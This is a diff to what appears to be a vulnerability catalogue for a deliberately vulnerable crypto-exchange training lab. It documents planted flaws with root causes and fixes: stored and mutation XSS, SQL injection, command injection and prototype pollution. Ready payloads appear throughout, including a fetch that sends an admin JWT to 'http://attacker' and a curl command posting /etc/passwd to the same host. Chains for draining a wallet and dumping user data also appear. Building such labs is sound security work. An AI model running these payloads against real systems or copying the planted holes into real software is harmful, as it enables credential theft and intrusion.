@@ -379,9 +379,90 @@ Each entry:
 
 ---
 
+## Phase 8 — Admin, treasury, compliance, support
+
+### V-1: Stored XSS in displayName → admin panel
+
+- **Category:** OWASP / XSS
+- **Phase introduced:** 8
+- **Location:** `apps/web/app/admin/users/page.tsx` (the `nameCell(u)` helper + `<td dangerouslySetInnerHTML={{ __html: nameCell(u) }} />`) and `apps/web/app/admin/users/[id]/page.tsx` (`<h1 ... dangerouslySetInnerHTML={{ __html: nameHtml }} />`).
+- **Exploitation path:** Sign up as any user. PATCH `/api/v2/me/profile` (Phase-1 endpoint) and set `displayName` to `<img src=x onerror="fetch('http://attacker/?t='+localStorage['bvbe.access'])">`. When an admin opens `/admin/users` (or `/admin/users/<victimId>`), React injects the displayName directly into the cell HTML; the `onerror` fires in the admin's session and exfiltrates the admin's JWT from `localStorage`. Combined with V-35 / V-41 → admin takeover.
+- **Intended discovery difficulty:** easy
+- **Realistic root cause:** Engineer wanted to render `displayName` in bold once KYC was approved, and reached for `dangerouslySetInnerHTML` to wrap the value in `<strong>...</strong>` rather than refactoring the parent to compose a React element. The raw user input ended up inside the dangerously-rendered string.
+- **Remediation:** Render the label as a plain React text node and wrap with `<strong>` as a JSX element. If HTML decoration is genuinely required, sanitize via DOMPurify with a tight allowlist.
+- **Chain membership:** standalone (and a CHAIN B component — admin JWT exfiltration is one of the routes to becoming admin)
+
+### V-6: `/api/v1/internal/*` middleware-trust function-level access
+
+- **Category:** OWASP / Auth / Trust boundary
+- **Phase introduced:** 8
+- **Location:** `apps/web/middleware.ts` (the `INTERNAL_API_PREFIX` branch — "if `x-bvbe-internal-trace` header is non-empty, skip JWT auth") and `nginx/nginx.conf` (the `location /` strip list lacks a `proxy_set_header x-bvbe-internal-trace "";`).
+- **Exploitation path:** Hit any `/api/v1/internal/*` route through the public edge with header `x-bvbe-internal-trace: 1`. The middleware sees the header, assumes the request came from the internal LB, and returns `NextResponse.next()` without checking auth. Useful first stops: `GET /api/v1/internal/users` (full user DB including `passwordHash` and `totpSecret`), `GET /api/v1/internal/users/{id}`. Terminal stop: `POST /api/v1/internal/treasury/emergency-withdraw` (CHAIN A).
+- **Intended discovery difficulty:** easy-medium
+- **Realistic root cause:** The v1 API namespace was originally fronted by a private nginx that always stamped `x-bvbe-internal-trace` on incoming calls. When the team consolidated the deployment behind a single public nginx, they updated the strip list to include `x-bvbe-user-id` but forgot to add `x-bvbe-internal-trace`. Two header-strip omissions across two phases (V-46 added a third) — realistic team-org failure.
+- **Remediation:** Either (i) strip `x-bvbe-internal-trace` at nginx and verify a signed shared-secret instead, (ii) require mTLS client cert for the internal namespace, (iii) drop the bypass entirely and require admin JWT for `/api/v1/internal/*`.
+- **Chain membership:** CHAIN A (gate for `/api/v1/internal/treasury/emergency-withdraw`) and CHAIN D (gate for `/api/v1/internal/users` full-DB exfil)
+
+### V-11: SQL injection via `?perf=1` admin user search
+
+- **Category:** OWASP / SQLi
+- **Phase introduced:** 8
+- **Location:** `apps/web/app/api/v2/admin/users/search/route.ts` (the `if (perf === "1")` branch — `prisma.$queryRawUnsafe(\`SELECT ... WHERE email ILIKE '%${q}%' OR "displayName" ILIKE '%${q}%' ... \`)`).
+- **Exploitation path:** Authenticate as an admin (forged JWT, V-19/V-35 path, or legitimate). Hit `GET /api/v2/admin/users/search?perf=1&q=%25%27%20UNION%20SELECT%20id%2C%22passwordHash%22%2C%22totpSecret%22%2Cemail%2C0%20FROM%20users--`. The `q` value is interpolated verbatim into a single-quoted SQL literal; closing the literal with `%'` and UNIONing in additional columns yields password hashes and TOTP secrets from the response. Blind/time-based variants via `pg_sleep` work as well.
+- **Intended discovery difficulty:** easy-medium
+- **Realistic root cause:** Prisma's ILIKE-based search felt slow on a large staging snapshot of the users table, so a senior engineer added a "performance mode" that built the same query with `$queryRawUnsafe` for direct planner control. The intent was "skip the ORM tax for hot lookups"; the bound parameter was lost in the rewrite.
+- **Remediation:** Replace the `$queryRawUnsafe` call with `prisma.$queryRaw` and template-tagged interpolation (which forwards parameters as bound values). Better: keep the Prisma `findMany` path and tune via a partial GIN index on `lower(display_name)` for large tables.
+- **Chain membership:** standalone (and a CHAIN D component — direct read of auth material)
+
+### V-12: 2nd-order SQL injection via stored `displayName` in compliance report
+
+- **Category:** OWASP / SQLi
+- **Phase introduced:** 8
+- **Location:** `apps/web/app/api/v2/admin/compliance/report/route.ts` (the per-case `for` loop — `prisma.$queryRawUnsafe(\`SELECT COUNT(*) ... FROM users WHERE "displayName" LIKE '%${dn}%'\`)` where `dn` is the subject user's stored `displayName`).
+- **Exploitation path:** Any user under compliance review controls their own displayName via the normal profile update path (which uses Prisma's parameterized update — safe insert). Set `displayName` to a SQLi payload, e.g. `x' OR (SELECT pg_sleep(5)) IS NULL --`. When an admin runs `GET /api/v2/admin/compliance/report`, the handler pulls active cases, iterates per case, and splats the subject's stored displayName into a raw query. The injection executes server-side; time-based blind exfiltration follows the standard playbook (CASE WHEN ... THEN pg_sleep ELSE 0 END, byte-by-byte against `users.password_hash`).
+- **Intended discovery difficulty:** hard
+- **Realistic root cause:** Engineer needed "users with similar names — flag potential sybil networks." The Prisma equivalent (`findMany` + JS counting) ran out of memory on a large case batch, so they reached for raw SQL with one query per case. Because `displayName` is stored at user-controlled rest, the Prisma-safe write is the source of an unsafe read.
+- **Remediation:** Use `prisma.$queryRaw` with template-tagged interpolation so the displayName is bound, or move the similarity computation into application code with paginated reads. Best: compute the similarity metric offline in the worker and surface a denormalized `similar_count` column.
+- **Chain membership:** standalone
+
+### V-17: OS command injection in compliance PDF export
+
+- **Category:** OWASP / Command injection
+- **Phase introduced:** 8
+- **Location:** `apps/web/app/api/v2/admin/compliance/cases/[id]/export-pdf/route.ts` (the `const cmd = \`pdftk-mock --case ${id} --out /tmp/${name}.pdf 2>/dev/null\`` line, passed to `spawn(cmd, [], { shell: true })`).
+- **Exploitation path:** Authenticate as admin. Hit `GET /api/v2/admin/compliance/cases/<existingCaseId>/export-pdf?name=foo;sleep%205;%23`. The `name` query param is concatenated into the command string with no escaping. With `shell: true`, the shell parses the `;sleep 5;` and executes a second command before the PDF output redirect. Side channels: `;curl -d @/etc/passwd http://attacker;` (against the docker network — the SSRF egress concern lives in V-40, not here), `;ping -c 1 attacker-host;` etc. The mock `pdftk-mock` script may not exist on PATH; that is acceptable in the lab — the injected command runs first, observed as a measurable delay or out-of-band signal.
+- **Intended discovery difficulty:** medium
+- **Realistic root cause:** Engineer building the PDF export needed to silence `pdftk`'s chatty stderr ("operator info" lines) and reached for `shell: true` to use shell redirection (`2>/dev/null`) rather than wiring `child.stderr.on('data', ...)` and dropping the chunks. With `shell: true`, the argv-array discipline that protects native `spawn` calls is gone — the single command string is parsed by `sh -c`, and any concatenated user input becomes a shell tokenization vector.
+- **Remediation:** Drop `shell: true`. Use `spawn("pdftk-mock", ["--case", id, "--out", `/tmp/${path.basename(name)}.pdf`], { stdio: ["ignore", "pipe", "ignore"] })` — argv-array form means each element is a single argv token, immune to shell parsing. If shell redirection is genuinely required, build the string with `path.basename(name)` whitelist + a strict alphanumeric regex check.
+- **Chain membership:** standalone
+
+### V-18: mutation XSS via single-quoted attribute sink in admin ticket renderer
+
+- **Category:** OWASP / XSS / mXSS
+- **Phase introduced:** 8
+- **Location:** `packages/shared/src/markdown.ts` (`sanitizeForAdmin` — the regex `/on\w+\s*=\s*"[^"]*"/gi` matches only double-quoted `on*` handlers) → consumed by `apps/web/app/api/v2/admin/tickets/[id]/route.ts` (returns `bodyHtml = sanitizeForAdmin(m.bodyMd)`) and rendered by `apps/web/app/admin/tickets/[id]/page.tsx` via `dangerouslySetInnerHTML`.
+- **Exploitation path:** Open a support ticket as any user. In the ticket body, include the markdown HTML pass-through `<img src=x onerror='alert(1)'>` (single quotes) or `<img src=x onerror=alert(1)>` (unquoted). The admin sanitizer's `on*` regex requires double quotes, so the handler survives. The admin opens `/admin/tickets/<id>` — `dangerouslySetInnerHTML` injects the surviving HTML into the agent's session and the handler fires. Exfiltrates the admin JWT via `localStorage["bvbe.access"]` the same way V-1 does. The user-facing renderer at `/support/tickets/[id]` uses `sanitizeForUser` which strips all tags — the mXSS is admin-only by design.
+- **Intended discovery difficulty:** medium
+- **Realistic root cause:** Engineer hand-rolled a small sanitizer because "the team's PR review burned out on adding a heavyweight HTML sanitizer dep, so a regex is fine for now." The regex pattern was lifted from a Stack Overflow answer that only covered double-quoted attributes. The user-side renderer was given the strict treatment because end-user injection felt scarier ("user replies could attack the user back").
+- **Remediation:** Replace the regex with DOMPurify (`isomorphic-dompurify` works in both Node and the browser). Don't roll a custom HTML sanitizer.
+- **Chain membership:** standalone (and a CHAIN B component — admin JWT exfiltration via stored XSS)
+
+### V-34: Prototype pollution via hand-rolled deepMerge in trade-debug replay
+
+- **Category:** OWASP / Prototype pollution
+- **Phase introduced:** 8
+- **Location:** `apps/web/app/api/v1/internal/trade-debug/replay/route.ts` (the hand-rolled `deepMerge({ ...DEFAULT_CONFIG }, parsed.data.config ?? {})` call) — downstream reader: `apps/web/lib/feature-flags.ts` (`resolveFlags` uses `for...in` over a prototype-backed defaults object, so inherited properties surface as own keys on the returned flag map).
+- **Exploitation path:** Step 1 — bypass `/api/v1/internal/*` auth via V-6 (`x-bvbe-internal-trace: 1`). Step 2 — POST `{"scenario":"foo","config":{"__proto__":{"adminPanel":true}}}` to `/api/v1/internal/trade-debug/replay`. The hand-rolled deepMerge iterates `Object.keys(source)` (which includes `__proto__` when it arrived via `JSON.parse` as an own property), walks into `target["__proto__"]` (which resolves to `Object.prototype`), and merges `{adminPanel: true}` into it — mutating `Object.prototype.adminPanel = true` for the lifetime of the process. Step 3 — call `GET /api/v2/me/flags` as any authenticated user with no `flags` claim on their JWT. `resolveFlags` builds `defaults = Object.create({})` (prototype is `Object.prototype`, which now carries `adminPanel`), and the `for...in` loop walks the prototype chain — copying `adminPanel: true` onto the returned `flags` map as an own property, so `JSON.stringify` serializes it. The response shows `{ flags: { adminPanel: true } }` — the admin nav opens for the polluted-prototype user. Combined with V-6, the polluted user can now reach the internal namespace's data endpoints (no admin JWT required, just the spoofable trace header).
+- **Intended discovery difficulty:** hard
+- **Realistic root cause:** Two careless choices that look reasonable in isolation: (a) the engineer hand-rolled `deepMerge` to avoid pulling lodash's full deep-merge weight (a common micro-optimization in Next.js apps trying to keep the server bundle small) and wrote the canonical loop `for (const key of Object.keys(source)) { ... target[key] = ... }` — exactly the prototype-pollution gadget that's been described in dozens of CVE writeups, but easy to write if you're not thinking about `__proto__` as a possible key. (b) The engineer who wrote `resolveFlags` used `for...in` over a defaults object instead of `Object.keys`, because they wanted "framework default flag inheritance" — defaults set on a shared prototype should bubble through to every resolver call without explicit registration. `for...in` walks the prototype chain, which is exactly the desired behavior for inherited defaults — and exactly the bridge that turns a polluted `Object.prototype` into a serializable `flags` payload.
+- **Remediation:** In the deepMerge, reject keys in `["__proto__", "constructor", "prototype"]` before recursing; or build on a null-prototype object (`Object.create(null)`) so writes to `__proto__` become a plain own property. In `resolveFlags`, switch to `Object.keys` (own properties only) and an explicit allowlist of known flag names. Add a defense-in-depth `Object.freeze(Object.prototype)` at process start. Prefer `structuredClone` + explicit overlay over hand-rolled merges entirely.
+- **Chain membership:** standalone (chain enrichment for "admin nav exposure for non-admins" — not part of CHAIN A/B/C/D's terminal moves, but a useful pivot)
+
+---
+
 ## Killer chains — current state
 
-- **CHAIN A — Drain the hot wallet:** components landed = V-19 (forge admin JWT) + V-33 (PSBT validate-vs-broadcast mismatch in the treasury coordinator). Remaining: git-history JWT signing key leak (Phase 9) and `/api/v1/internal/treasury/emergency-withdraw` function-level access (Phase 8). Phase 7 leaves V-33 reachable only by insider-treasury-operator threat; Phase 8+ lifts it to a forged-JWT primitive.
-- **CHAIN B — Become admin and persist:** components landed = V-35 (middleware bypass) + V-41 (admin JWT theft via polyglot). Remaining: smuggling at nginx (Phase 9).
+- **CHAIN A — Drain the hot wallet:** components landed = V-19 (forge admin JWT) + V-33 (PSBT validate-vs-broadcast mismatch in the treasury coordinator) + V-6 (`/api/v1/internal/*` middleware-trust bypass) + `/api/v1/internal/treasury/emergency-withdraw` terminal endpoint (Phase 8). **End-to-end exploitable as of Phase 8** using the `.env.example` JWT secret. Phase 9 adds the git-history secret leak so a zero-knowledge attacker can discover the JWT signing key without insider access.
+- **CHAIN B — Become admin and persist:** components landed = V-35 (middleware bypass) + V-41 (admin JWT theft via polyglot) + V-1 (stored XSS in displayName → admin panel) + V-18 (mXSS in markdown ticket → admin renderer). Multiple JWT-exfil routes are now available to an attacker. Remaining: smuggling at nginx (Phase 9).
 - **CHAIN C — Mass user takeover:** **end-to-end against margin liquidations.** Components: V-25 (self-trade → oracle manipulation), nginx `proxy_cache` infrastructure for `/api/v2/public/*`, and the Phase-5 liquidation engine consuming the manipulated oracle via HTTP-fetched public price feed. PoC in `docs/phases/phase-5/adversarial-qa.md` walks the full chain: V-35 + V-42 pre-stage tier-3 + balance, V-25 manipulates the BTC/USDT mid, the worker flags victim positions, attacker claims the keeper rebate. Phase 9 will add CL/TE-based cache poisoning to lift the attack beyond same-session reach.
-- **CHAIN D — Exfiltrate full user DB + KYC:** components landed = V-40 (SSRF → mock IMDS → IAM creds). Remaining: mock S3 bucket + DB backup access (Phase 9).
+- **CHAIN D — Exfiltrate full user DB + KYC:** components landed = V-40 (SSRF → mock IMDS → IAM creds) + V-6 + `/api/v1/internal/users` direct full-DB endpoint (Phase 8 — a second path that bypasses the SSRF step entirely). Remaining: mock S3 bucket + DB backup access (Phase 9, for the original SSRF route).
